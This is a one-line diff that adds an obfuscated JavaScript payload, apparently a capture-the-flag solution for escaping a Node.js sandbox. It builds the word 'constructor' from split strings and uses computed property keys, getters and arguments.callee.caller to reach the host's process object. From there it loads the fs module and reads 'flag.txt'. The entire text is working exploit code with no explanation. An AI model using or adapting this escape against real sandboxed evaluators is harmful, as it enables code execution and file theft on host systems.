@@ -1,0 +1,1 @@
+([a="defineProperty",b="return process",c="flag.txt"],x="construc"+"tor",{[d=(f)=>Object[a](this,"z",{get:f})]:y="readFileSync",[e=(m)=>m[x](b)().mainModule.require("fs")[y](c)]:1,[d (function(){return e(arguments.callee.caller)})]:1})
